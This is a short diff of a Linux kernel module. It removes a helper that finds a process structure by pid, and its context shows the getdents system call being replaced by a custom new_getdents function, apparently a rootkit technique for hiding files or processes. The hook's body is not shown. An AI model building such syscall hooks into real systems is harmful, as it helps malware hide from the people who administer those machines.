@@ -90,18 +90,6 @@ sudo rmmod lkm
 Makefile  lkm  lkm.ko
 */
 
-struct task_struct *get_task(pid_t pid) //get task_struct from pid, if in PROC
-{
- struct task_struct *p = current;
- do {
-  if (p->pid == pid)
-   return p;
-   p = next_task(p);
-  }
-  while (p != current);
-  return NULL;
-}
-
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
